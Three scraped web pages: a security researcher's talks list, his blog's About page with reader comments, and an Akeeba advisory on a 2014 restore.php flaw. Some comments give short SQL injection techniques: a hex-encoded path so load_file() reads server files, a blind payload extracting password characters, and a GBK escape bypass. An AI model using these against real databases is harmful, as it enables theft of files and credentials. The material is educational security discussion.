=== Content from websec.wordpress.com_8e3846a3_20250126_035950.html ===

# [Reiners‚Äô Weblog](https://websec.wordpress.com/)

anything about Web Security

* [Home](https://websec.wordpress.com/)
* [Talks](https://websec.wordpress.com/talks/)
* [Tools](https://websec.wordpress.com/tools/)
* [About](https://websec.wordpress.com/about/)

## Talks

**Static Detection of Vulnerabilities in Modern PHP Applications**

26.11.2014, Bochum, Germany, Hackerpraktikum
<https://www.nds.rub.de/teaching/hackpra/> ([video](https://www.youtube.com/watch?v=IpfpbIqR89o), [slides](https://websec.wordpress.com/wp-content/uploads/2010/11/rips_hackpra.pdf))

**Code Reuse At¬≠tacks in PHP: Au¬≠to¬≠ma¬≠ted POP Chain Ge¬≠ne¬≠ra¬≠ti¬≠on**

04.11.2014, Scotts¬≠da¬≠le (AZ), USA, CCS
<http://www.sigsac.org/ccs/CCS2014/pro_paper.html> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/rips_ccs.pdf))

**Sta¬≠tic De¬≠tec¬≠tion of Se¬≠cond-Or¬≠der Vul¬≠nerabi¬≠li¬≠ties in Web Ap¬≠p¬≠li¬≠ca¬≠ti¬≠ons**

21.08.2014, San Diego (CA), USA, Usenix Security
<https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/dahse> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/rips_usenix.pdf))

**Si¬≠mu¬≠la¬≠ti¬≠on of Built-in PHP fea¬≠tures for Pre¬≠cise Sta¬≠tic Code Ana¬≠ly¬≠sis**

22.02.2014, San Diego (CA), USA, NDSS

<http://www.internetsociety.org/doc/simulation-built-php-features-precise-static-code-analysis> ([slides](http://www.internetsociety.org/sites/default/files/04_5_slides.pdf))

**Logical Flaws in a PHP banking application**

08.07.2012, Bochum, Germany, GData Academy
<https://www.gdata.de> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/gdata_bank_en.pdf))

**RIPS ‚Äì Automatisierte Schwachstellenerkennung in PHP-Software mittels statischer Quellcode-Analyse**

11.05.2011, Bonn, Germany, 12. Deutscher IT-Sicherheitskongress

<https://www.bsi.bund.de/ContentBSI/Aktuelles/Veranstaltungen/IT-SiKongress/12itkongress2011.html> ([slides](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Veranstaltungen/ITSiKongress/2011/Praesentationen/11_Mai_Grosser_Saal/Johannes-Dahse-RIPS.pdf?__blob=publicationFile))

**SQLi filter evasion and obfuscation**

29.11.2010, Prague, Czech Republic, CONFidence 2.0

<http://201002.confidence.org.pl/prelegenci/johannes-dahse> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/sqli2.pdf))

**Social Network Attacks**

20.07.2010, Bochum, Germany, Ruhr-University Bochum

<http://emma.rub.de/teaching/courses/511/> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/socialnetworks.pdf))

**RIPS ‚Äì A static source code analyser for vulnerabilities in PHP scripts**

05.07.2010, Bochum, Germany, Ruhr-University Bochum

<http://www.nds.rub.de/teaching/seminararbeiten/> ([slides](https://websec.wordpress.com/wp-content/uploads/2010/11/rips-slides.pdf))

**Web Security course ‚ÄúHackerpraktikum‚Äù**

2009-2011, Bochum, Germany, Ruhr-University Bochum
<http://www.nds.rub.de/chair/lectures/439/>

**Basics of Web Security**

29.05.2008, Bochum, Germany, Das Labor
<https://www.das-labor.org/wiki/Grundlagen_der_Web-Sicherheit>

### Share this:

* [Facebook](https://websec.wordpress.com/talks/?share=facebook "Click to share on Facebook")
* [X](https://websec.wordpress.com/talks/?share=x "Click to share on X")
Like Loading...

### Leave a comment [Cancel reply](/talks/#respond)

Œî

* ## Archives

  + [November 2016](https://websec.wordpress.com/2016/11/)
  + [January 2015](https://websec.wordpress.com/2015/01/)
  + [December 2014](https://websec.wordpress.com/2014/12/)
  + [October 2014](https://websec.wordpress.com/2014/10/)
  + [May 2013](https://websec.wordpress.com/2013/05/)
  + [March 2013](https://websec.wordpress.com/2013/03/)
  + [February 2013](https://websec.wordpress.com/2013/02/)
  + [June 2012](https://websec.wordpress.com/2012/06/)
  + [January 2012](https://websec.wordpress.com/2012/01/)
  + [December 2011](https://websec.wordpress.com/2011/12/)
  + [September 2011](https://websec.wordpress.com/2011/09/)
  + [June 2011](https://websec.wordpress.com/2011/06/)
  + [April 2011](https://websec.wordpress.com/2011/04/)
  + [December 2010](https://websec.wordpress.com/2010/12/)
  + [October 2010](https://websec.wordpress.com/2010/10/)
  + [June 2010](https://websec.wordpress.com/2010/06/)
  + [May 2010](https://websec.wordpress.com/2010/05/)
  + [March 2010](https://websec.wordpress.com/2010/03/)
  + [February 2010](https://websec.wordpress.com/2010/02/)
  + [November 2009](https://websec.wordpress.com/2009/11/)
  + [January 2009](https://websec.wordpress.com/2009/01/)
  + [December 2008](https://websec.wordpress.com/2008/12/)
  + [October 2008](https://websec.wordpress.com/2008/10/)
  + [September 2008](https://websec.wordpress.com/2008/09/)
  + [May 2008](https://websec.wordpress.com/2008/05/)
  + [November 2007](https://websec.wordpress.com/2007/11/)
* ## Categories

  + [CTF](https://websec.wordpress.com/category/ctf/)
  + [Java](https://websec.wordpress.com/category/java/)
  + [Other](https://websec.wordpress.com/category/other/)
  + [PHP](https://websec.wordpress.com/category/php/)
  + [Projects](https://websec.wordpress.com/category/projects/)
  + [SQLi](https://websec.wordpress.com/category/sqli/)
  + [Vulns](https://websec.wordpress.com/category/vulns/)
  + [Web Security](https://websec.wordpress.com/category/web-security/)
  + [XSS](https://websec.wordpress.com/category/xss/)
* ## active

  + [FluxFingers](http://www.fluxfingers.net "CTF team")
  + [RIPS Technologies](https://www.ripstech.com "RIPS Technologies")
  + [sla.ckers](http://sla.ckers.org/forum/ "WebAppSec forum")
  + [twitter](http://twitter.com/FluxReiners)
* ## blogs

  + [Bernardo Damele](http://bernardodamele.blogspot.com/)
  + [christ1an](http://christ1an.blogspot.com/)
  + [d0mber](http://d0mber.blogspot.com)
  + [Das Labor](http://www.das-labor.org/blog/)
  + [Gareth Heyes](http://www.thespanner.co.uk/)
  + [Gnarf](http://devels-playground.blogspot.com/)
  + [gnucitizen](http://www.gnucitizen.org/)
  + [hackademix](http://hackademix.net/)
  + [hackathology](http://hackathology.blogspot.com/)
  + [Kishor](http://wasjournal.blogspot.com/)
  + [kuza55](http://kuza55.blogspot.com/)
  + [pentestmonkey](http://pentestmonkey.net/blog/)
  + [PHPIDS](http://phpids.org/)
  + [RSnake](http://ha.ckers.org/)
  + [sirdarckcat](http://sirdarckcat.blogspot.com/)
  + [thornmaker](http://p42.us/)
* ## Meta

  + [Register](https://wordpress.com/start?ref=wplogin)
  + [Log in](https://websec.wordpress.com/wp-login.php)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)

  Join 114 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Ftalks%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Ftalks%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/P8KAZ-7p)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://websec.wordpress.com/talks/)
  + [View post in Reader](https://wordpress.com/read/blogs/2085741/posts/459)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from websec.wordpress.com_0d1a168e_20250126_040001.html ===

# [Reiners‚Äô Weblog](https://websec.wordpress.com/)

anything about Web Security

* [Home](https://websec.wordpress.com/)
* [Talks](https://websec.wordpress.com/talks/)
* [Tools](https://websec.wordpress.com/tools/)
* [About](https://websec.wordpress.com/about/)

## About

My name is Johannes Dahse and I studied ‚ÄúIT-Security‚Äù at the Ruhr-University Bochum in Germany. Currently I am doing my PhD at the Chair for Systems Security in the area of static code analysis and work as a penetration tester and security consultant.

Contact: johannes.dahse at rub. de

### Share this:

* [Facebook](https://websec.wordpress.com/about/?share=facebook "Click to share on Facebook")
* [X](https://websec.wordpress.com/about/?share=x "Click to share on X")
Like Loading...

### 22 Responses to *About*

1. ![](https://0.gravatar.com/avatar/6c57128d40daaa31cd0ce26d29233084b75b97d213531cbad2eec8bf6b668670?s=32&d=identicon&r=G) ZinovaS says:
   [November 24, 2008 at 7:13 pm](https://websec.wordpress.com/about/#comment-82)

   Hi,

   i found your articles very informative. i learned a lot from it. thats why i want to thank you and provide you with some piece of information.

   you wrote that there is no way to give a path to load\_file not using ‚Äòquotes ‚Äò

   actually there is a way:

   SELECT CONCAT(‚Äò0x‚Äô,HEX(‚Äò/path/to/file.php‚Äô));

   that gives you a pathname in hex (could be done in other ways):

   0x2F706174682F746F2F66696C652E706870

   and now we can use it like this:

   SELECT load\_file(0x2F706174682F746F2F66696C652E706870);

   and it works for me in 5.0.32-Debian\_7etch6-log

   [Reply](https://websec.wordpress.com/about/?replytocom=82#respond)
3. ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
   [November 24, 2008 at 9:51 pm](https://websec.wordpress.com/about/#comment-83)

   hi, glad you like them. thanks for your hint but I was referring to INTO OUTFILE when I wrote that the quotes are definetly neccessary for the path. you probably mixed up the articles üòâ load\_file() of course accepts encoding as any other function, but INTO OUTFILE as being an operation, not a function, doesnt support a way to avoid quotes (afaik).

   [Reply](https://websec.wordpress.com/about/?replytocom=83#respond)
5. ![](https://2.gravatar.com/avatar/82c78b10fafb0e8446e0857f05216e9a069ba35eaf2e20adb613d79d1a43f08b?s=32&d=identicon&r=G) Aoife says:
   [March 25, 2011 at 3:08 pm](https://websec.wordpress.com/about/#comment-688)

   Hi,

   just wondering what RIPS stand for?

   Cheers,

   Aoife

   [Reply](https://websec.wordpress.com/about/?replytocom=688#respond)
   * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
     [March 25, 2011 at 3:39 pm](https://websec.wordpress.com/about/#comment-689)

     Hi,

     actually it stands for **R**einers **I**ronic **P**HP **S**canner ‚Ä¶ ironic because it is a PHP app scanning PHP apps. However I find the acronym not really sexy so I never mention it anywhere üòâ

     Cheers,

     Reiners

     [Reply](https://websec.wordpress.com/about/?replytocom=689#respond)
7. ![](https://1.gravatar.com/avatar/4b0edb38e604c3af4e625a2665bbc77c7e210e19a15e0d3778eb961cbc378ae2?s=32&d=identicon&r=G) Tobbe says:
   [April 7, 2011 at 5:23 am](https://websec.wordpress.com/about/#comment-726)

   Hi,

   Thanks for all your great articles.

   Is there any possibility of you adding an RSS feed to this page? I‚Äôd like to subscribe to it in my rss reader. Thank you!

   [Reply](https://websec.wordpress.com/about/?replytocom=726#respond)
   * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
     [April 7, 2011 at 3:04 pm](https://websec.wordpress.com/about/#comment-732)

     hi,

     you can use <https://websec.wordpress.com/feed/>.

     hope that works üòâ

     [Reply](https://websec.wordpress.com/about/?replytocom=732#respond)
     + ![](https://1.gravatar.com/avatar/4b0edb38e604c3af4e625a2665bbc77c7e210e19a15e0d3778eb961cbc378ae2?s=32&d=identicon&r=G) Tobbe says:
       [April 16, 2011 at 5:53 am](https://websec.wordpress.com/about/#comment-798)

       Sweet, thank you üôÇ Works great!
9. [RIPS ‚Äì Quellcode Analyse Tool f√ºr Sicherheitsl√ºcken ¬´ e-TuT.de ‚Äì Weblog](http://e-tut.de/2011/rips-quellcode-analyse-tool-fur-sicherheitsluecken/) says:
   [May 11, 2011 at 11:15 am](https://websec.wordpress.com/about/#comment-860)

   [‚Ä¶] man das Programm benutzt, r√§t der Autor zuerst das Infopaper zu lesen, welches sich -> hier <- findet. Zudem ist das Tool noch lange [‚Ä¶]

   [Reply](https://websec.wordpress.com/about/?replytocom=860#respond)
11. ![](https://2.gravatar.com/avatar/b9f45d153b15d4ca2f94113671a62f2b5c356b493ff374c5f8750f32e90665f1?s=32&d=identicon&r=G) Adela Ku≈∫niarska says:
    [August 4, 2011 at 9:30 am](https://websec.wordpress.com/about/#comment-927)

    Hello

    My name is Adela Ku≈∫niarska and I represent PenTest Magazine- the only publication devoted to penetration testing

    We are looking for authors who could provide us with some interesting articles concerning penetration testing and vulnerability management.

    We need people to write influential article about the Nessus software by now.

    I believe your expertise in this matter might be invaluable to our readers and maybe you could share your knowledge with us.

    Would you be interested in hearing more details?

    For more information please visit <http://www.pentestmag.com>

    I am looking forward to hearing from you.

    Best Regards

    Adela Ku≈∫niarska

    PenTest Magazine

    [Reply](https://websec.wordpress.com/about/?replytocom=927#respond)
13. ![](https://1.gravatar.com/avatar/ac761ce3822dd3a04e9692b22a955bfe36ea29d218d516fec55a159294c24ec7?s=32&d=identicon&r=G) massi says:
    [August 8, 2011 at 9:37 am](https://websec.wordpress.com/about/#comment-935)

    hi Johannes,

    can I ask you how is it possible to make a blind query WITHOUT using query, when only other statements are available (i.e. case etc.)

    I‚Äôve seen you said it is possible -I tried to find a solution to that, but failed hard at‚Ä¶

    ‚Ä¶any idea or tip? üôÇ

    [Reply](https://websec.wordpress.com/about/?replytocom=935#respond)
15. ![](https://1.gravatar.com/avatar/ac761ce3822dd3a04e9692b22a955bfe36ea29d218d516fec55a159294c24ec7?s=32&d=identicon&r=G) massi says:
    [August 8, 2011 at 9:39 am](https://websec.wordpress.com/about/#comment-936)

    ooops, errata corrige:

    ‚Äúto make a blind query WITHOUT using a select statement‚Äù.

    Without a select i‚Äôm limited to read variables like version etc., but cant understand how to access table contetns‚Ä¶

    [Reply](https://websec.wordpress.com/about/?replytocom=936#respond)
    * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
      [August 8, 2011 at 1:06 pm](https://websec.wordpress.com/about/#comment-938)

      hi massi,

      as stated [here](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/) you can only access columns that are already in the field list (columns that are used in the original SELECT query you are injecting into).

      Example:

      SELECT name, password FROM users WHERE id = X

      If you want to access the password column you dont need a subselect, because it is already in the field list:

      X= if(mid(password,1,1)=0x61,1,2)

      However if your desired column/table is not already in the field list, there is no way to access is without using another SELECT.

      Cheers,

      Reiners

      [Reply](https://websec.wordpress.com/about/?replytocom=938#respond)
17. ![](https://i0.wp.com/a0.twimg.com/profile_images/1410437162/ppb.php_normal.jpg?resize=32%2C32&ssl=1) [gj.weng (@ay520)](http://twitter.com/ay520) says:
    [June 20, 2012 at 7:07 am](https://websec.wordpress.com/about/#comment-1628)

    hello,your blog is very nice,i am from china,i have learned a lot from your site,so,then,i have a question:

    this url : <https://websec.wordpress.com/2011/06/>

    this article,you say ‚Äúmysql\_real\_escape\_string‚Äù can be safe

    // safe

    $name = mysql\_real\_escape\_string($\_GET[‚Äòname‚Äô]);

    mysql\_query(‚ÄúSELECT \* FROM users WHERE name = ‚Äò$name'‚Äù);

    but i find that it is also vulnerable,when mysql‚Äôs character is gbk,

    ?name=%bf%27 will also work well in sql injection

    [Reply](https://websec.wordpress.com/about/?replytocom=1628#respond)
    * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
      [June 20, 2012 at 8:46 am](https://websec.wordpress.com/about/#comment-1629)

      yes it is insecure with some asian character sets, as described in detail [here](https://websec.wordpress.com/2012/06/12/secuinside-ctf-writeup-sqlgeek/ "secuinside ctf writeup sqlgeek"). however since those character sets are very rarely used (at least here in europe) one can assume that mysql\_real\_escape\_string is safe. To be sure you should always use prepared statements. thanks for noting.

      [Reply](https://websec.wordpress.com/about/?replytocom=1629#respond)
19. ![](https://1.gravatar.com/avatar/a608362992161e31dfa6848024ca25d5a24b0a771ca87fa5dc97914a05e54b67?s=32&d=identicon&r=G) ysj says:
    [June 8, 2013 at 3:59 pm](https://websec.wordpress.com/about/#comment-2080)

    Hey, nice write up. I got a few questions:

    1. Under the WHERE ALTERNATIVE SECTION, you used having to replace where right? I thought having is only possible when there is group by and aggregate function?

    2. If /union/i was used in their filter, according to your expertise, is it still possible to bypass it and use the union keyword?

    thanks üôÇ

    [Reply](https://websec.wordpress.com/about/?replytocom=2080#respond)
21. ![](https://2.gravatar.com/avatar/bddd460cae31df4504768b503b88c770b08379fdbe7a49de9a68b1a23083f706?s=32&d=identicon&r=G) [Aaron](http://www.mobilesecuritythreat.com) says:
    [September 10, 2013 at 8:57 pm](https://websec.wordpress.com/about/#comment-2352)

    Nice articles Johannes ! Very technical which is not found in much blogs.

    [Reply](https://websec.wordpress.com/about/?replytocom=2352#respond)
23. ![](https://0.gravatar.com/avatar/cd4112cc960080e5b5a74e4f4eb9fecad58ccc1fa0c885a78f58b68805c57ecf?s=32&d=identicon&r=G) Dm says:
    [November 6, 2013 at 11:34 am](https://websec.wordpress.com/about/#comment-2546)

    hey Reiners,

    Are there any type of sqli that bypass an integer type cast ? Like this:

    public int? IdAssunto { get; set; }

    I was looking on things like ASCII HEX Encoded injection but wanna check with you too.

    Rergard

    [Reply](https://websec.wordpress.com/about/?replytocom=2546#respond)
    * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
      [November 28, 2013 at 9:20 am](https://websec.wordpress.com/about/#comment-2611)

      no, INTs are safe, unless the application decodes them before concatenating into a SQL query.

      [Reply](https://websec.wordpress.com/about/?replytocom=2611#respond)
25. ![](https://2.gravatar.com/avatar/21734c695027328a5f88c3e24bf2276a1f3326c84574990dbaa9bec1a45cd226?s=32&d=identicon&r=G) Javed says:
    [December 9, 2013 at 7:59 am](https://websec.wordpress.com/about/#comment-2642)

    Hi Reiners,

    How are you can I‚Äôve your email , ive sent email on your mentioned address above but it bounce back . I need your assistance in penetration of web app for WAF bypass.

    Regards

    Javed

    [Reply](https://websec.wordpress.com/about/?replytocom=2642#respond)
27. ![](https://0.gravatar.com/avatar/9b353ebe9b00c7f220b526481ecd88710e0cb8b744a66c3c4c9f31c3d7ce63d4?s=32&d=identicon&r=G) Tien says:
    [November 18, 2014 at 3:55 am](https://websec.wordpress.com/about/#comment-4063)

    If I use ‚Äúselect data into outfile [path]‚Äù but the quote ‚Äò and double ‚Äù are filtered, is there way to write file in this case? Thanks.

    [Reply](https://websec.wordpress.com/about/?replytocom=4063#respond)
    * ![](https://2.gravatar.com/avatar/8c52e9c693641056e50ed5886ca388f64de0a0e3c7e7a9d1590d8e28121cb367?s=32&d=identicon&r=G) Reiners says:
      [November 22, 2014 at 10:18 am](https://websec.wordpress.com/about/#comment-4122)

      no, not that I am aware of ![:/](https://s1.wp.com/wp-content/mu-plugins/wpcom-smileys/uneasy.svg)

      [Reply](https://websec.wordpress.com/about/?replytocom=4122#respond)
      + ![](https://0.gravatar.com/avatar/05cf4ed97ec0144dd8a943e1b70fd778fe60560585c81aec30a2447a4f153666?s=32&d=identicon&r=G) Tien says:
        [November 23, 2014 at 2:11 pm](https://websec.wordpress.com/about/#comment-4127)

        Thanks you!

### Leave a comment [Cancel reply](/about/#respond)

Œî

* ## Archives

  + [November 2016](https://websec.wordpress.com/2016/11/)
  + [January 2015](https://websec.wordpress.com/2015/01/)
  + [December 2014](https://websec.wordpress.com/2014/12/)
  + [October 2014](https://websec.wordpress.com/2014/10/)
  + [May 2013](https://websec.wordpress.com/2013/05/)
  + [March 2013](https://websec.wordpress.com/2013/03/)
  + [February 2013](https://websec.wordpress.com/2013/02/)
  + [June 2012](https://websec.wordpress.com/2012/06/)
  + [January 2012](https://websec.wordpress.com/2012/01/)
  + [December 2011](https://websec.wordpress.com/2011/12/)
  + [September 2011](https://websec.wordpress.com/2011/09/)
  + [June 2011](https://websec.wordpress.com/2011/06/)
  + [April 2011](https://websec.wordpress.com/2011/04/)
  + [December 2010](https://websec.wordpress.com/2010/12/)
  + [October 2010](https://websec.wordpress.com/2010/10/)
  + [June 2010](https://websec.wordpress.com/2010/06/)
  + [May 2010](https://websec.wordpress.com/2010/05/)
  + [March 2010](https://websec.wordpress.com/2010/03/)
  + [February 2010](https://websec.wordpress.com/2010/02/)
  + [November 2009](https://websec.wordpress.com/2009/11/)
  + [January 2009](https://websec.wordpress.com/2009/01/)
  + [December 2008](https://websec.wordpress.com/2008/12/)
  + [October 2008](https://websec.wordpress.com/2008/10/)
  + [September 2008](https://websec.wordpress.com/2008/09/)
  + [May 2008](https://websec.wordpress.com/2008/05/)
  + [November 2007](https://websec.wordpress.com/2007/11/)
* ## Categories

  + [CTF](https://websec.wordpress.com/category/ctf/)
  + [Java](https://websec.wordpress.com/category/java/)
  + [Other](https://websec.wordpress.com/category/other/)
  + [PHP](https://websec.wordpress.com/category/php/)
  + [Projects](https://websec.wordpress.com/category/projects/)
  + [SQLi](https://websec.wordpress.com/category/sqli/)
  + [Vulns](https://websec.wordpress.com/category/vulns/)
  + [Web Security](https://websec.wordpress.com/category/web-security/)
  + [XSS](https://websec.wordpress.com/category/xss/)
* ## active

  + [FluxFingers](http://www.fluxfingers.net "CTF team")
  + [RIPS Technologies](https://www.ripstech.com "RIPS Technologies")
  + [sla.ckers](http://sla.ckers.org/forum/ "WebAppSec forum")
  + [twitter](http://twitter.com/FluxReiners)
* ## blogs

  + [Bernardo Damele](http://bernardodamele.blogspot.com/)
  + [christ1an](http://christ1an.blogspot.com/)
  + [d0mber](http://d0mber.blogspot.com)
  + [Das Labor](http://www.das-labor.org/blog/)
  + [Gareth Heyes](http://www.thespanner.co.uk/)
  + [Gnarf](http://devels-playground.blogspot.com/)
  + [gnucitizen](http://www.gnucitizen.org/)
  + [hackademix](http://hackademix.net/)
  + [hackathology](http://hackathology.blogspot.com/)
  + [Kishor](http://wasjournal.blogspot.com/)
  + [kuza55](http://kuza55.blogspot.com/)
  + [pentestmonkey](http://pentestmonkey.net/blog/)
  + [PHPIDS](http://phpids.org/)
  + [RSnake](http://ha.ckers.org/)
  + [sirdarckcat](http://sirdarckcat.blogspot.com/)
  + [thornmaker](http://p42.us/)
* ## Meta

  + [Register](https://wordpress.com/start?ref=wplogin)
  + [Log in](https://websec.wordpress.com/wp-login.php)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)

  Join 114 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Fabout%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Fabout%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/P8KAZ-5)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://websec.wordpress.com/about/)
  + [View post in Reader](https://wordpress.com/read/blogs/2085741/posts/5)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from www.akeebabackup.com_3376e3bb_20250126_035955.html ===

[![Akeeba, Ltd.](/images/akeeba_4c.svg)](/)

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

[Search our site](https://duckduckgo.com/?q=site%3Aakeeba.com)

Expand Menu

Close Menu

---

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

# Security update, September 2014

**30 September 2014**
Last updated on 30 September 2014

**Executive summary**: It is possible for a remote attacker to extract a remotely hosted archive while you are extracting a backup archive / installing an update, depending on your server settings. The attack is **NOT** possible at any other time. Merely having our software installed **DOES NOT** make your site vulnerable. The vulnerability was discovered and reported by [Johannes Dahse](https://twitter.com/FluxReiners) of Horst G√∂rtz Institute for IT-Security (HGI), Ruhr-University Bochum, Germany.

### Affected software

* Akeeba Backup for Joomla! Professional, version 3.0.0 up to and including 4.0.2
* Akeeba Backup Professional for WordPress, 1.0.b1 up to and including 1.1.3
* Akeeba Solo, 1.0.b1 up to and including 1.1.2
* Admin Tools Core and Professional, version 2.0.0 up to and including 2.4.4. Later versions are not affected as they do not include the Joomla! update feature.
* Akeeba CMS Update, version 1.0.a1 up to and including 1.0.1
* Joomla! 2.5, 3.0, 3.1, 3.2, 3.3 up to and including 3.3.4

### Impact

Merely having the affected software installed **DOES NOT** allow an attacker to compromise (hack) your site. An attacker has to attack at precisely the right moment: while a backup archive or Joomla! update package is being extracted at your site.

### Vulnerability disclosure

The affected software use Akeeba Restore (restore.php) to extract backup archives and update packages of the ZIP, JPA and JPS format. In order to protect from abuse by third parties the restore.php file won‚Äôt work until the software it‚Äôs used with generated a file called restoration.php. That file contains a cryptographic key which is used to authenticate the commands sent to restore.php.

The restoration.php file is created right before a. you extract a backup archive with the integrated restoration feature of Akeeba Backup / Akeeba Solo and b. you extract the Joomla! update package using Admin Tools, Akeeba CMS Update and Joomla! Update. The file is immediately removed after the extraction is complete. When the file is not present the restore.php file refuses any and all commands. Therefore, when you are not extracting a backup archive or updating your site it is not vulnerable to any attacks.

There is a bug discovered in restore.php which only appears when restoration.php is present, i.e. while a backup or update archive is being extracted on your site. Normally, only encrypted commands should be processed. Due to the bug you can bypass the encryption and send arbitrary commands to restore.php and only while it is extracting a backup or update archive. A malicious user with advanced knowledge could craft a special command message which would cause restore.php to extract a remotely stored archive to your site.

For this attack to work there are several conditions which must be met *at the same time*:

* A host with URL fopen() wrappers
* A host which allows direct file writes
* An attacker with advanced knowledge of PHP to craft the malicious message
* An attacker able to time his attack at the very short period of time (typically 5 to 90 seconds) it takes for a backup archive or update package to be extracted.

Due to the special conditions required merely having the affected software installed **DOES NOT** make your site vulnerable. However, this security issue *can* be used for targeted attacks against valuable targets. It‚Äôs worth noting that this kind of attack does leave a remarkable audit trail in the server log files.

### Corrective actions for subscribers

We have released new versions of Akeeba Backup for Joomla!, Akeeba Backup for WordPress, Akeeba Solo and Akeeba CMS Update in their currently maintained version branches.

Due to the severity of this security issue we are also releasing new versions of the unsupported, but affected, version branches of Akeeba Backup for Joomla! and Admin Tools. These new versions do not imply any change in our support policy. They are provided as a courtesy. The Compatibility page on our site has been updated accordingly.

Moreover we have been in touch with the Joomla! project. New versions of Joomla! 2.5 and 3.x will be released shortly today.

### Corrective actions for non-subscribers (manual mitigation)

If you are no longer a subscriber you **DO NOT** need to re-subscribe to get this security issue fixed. Instead follow these manual mitigation measures. Additionally, if you are using an old and unsupported version of Joomla! you can follow the same instructions.

1. Download the [restore-hotfix.zip](http://cdn.akeebabackup.com/downloads/restore/restore-hotfix.zip) file
2. Extract the restore-hotfix.zip file on your computer. You will now have a restore.php file.
3. Upload the extracted restore.php file to the following locations (some of these directories may not exist if you don‚Äôt have the respective software installed on your site, in which case you can ignore them):
   * **Joomla! 2.5 / 3.x**: administrator/components/com\_joomlaupdate/restore.php
   * **Akeeba CMS Update**: administrator/components/com\_cmsupdate/restore.php
   * **Akeeba Backup for Joomla! Professional**: administrator/components/com\_akeeba/restore.php
   * **Admin Tools 2.0.0 to 2.4.4**: administrator/components/com\_admintools/restore.php

**VERY IMPORTANT:** You may find other files called restore.php on your site. DO NOT REPLACE THEM. They are not the same file. Replacing them will cause problems with your site.

### Acknowledgments and additional information

